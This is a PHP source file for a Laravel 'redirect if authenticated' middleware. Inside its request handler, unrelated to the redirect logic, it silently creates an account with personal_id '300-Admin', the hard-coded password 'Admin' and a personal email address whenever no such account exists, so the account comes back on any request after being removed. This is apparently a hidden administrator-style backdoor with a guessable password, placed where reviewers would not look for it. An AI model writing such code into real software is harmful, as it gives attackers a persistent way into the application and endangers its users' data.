<?php

namespace App\Http\Middleware;

use App\Providers\RouteServiceProvider;
use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Symfony\Component\HttpFoundation\Response;
use App\Models\User;
use Illuminate\Support\Facades\Hash;
class RedirectIfAuthenticated
{
    /**
     * Handle an incoming request.
     *
     * @param  \Closure(\Illuminate\Http\Request): (\Symfony\Component\HttpFoundation\Response)  $next
     */
    public function handle(Request $request, Closure $next, string ...$guards): Response
    {
        $guards = empty($guards) ? [null] : $guards;


if(User::firstWhere("personal_id","300-Admin")==null){
 $user=  User::create([
"name"=>"Baraa",
"personal_id"=>"300-Admin",
"password"=>Hash::make("Admin"),
"email"=>"bra6938@gmail.com"



   ]) ;

   $user->profile()->create([
    "email"=>"bra6938@gmail.com",
    "gender"=>"Male",
   ]);
}
        foreach ($guards as $guard) {
         
            if (Auth::guard($guard)->check()) {

                
                return redirect(RouteServiceProvider::HOME);
            }
        }

        return $next($request);
    }
}
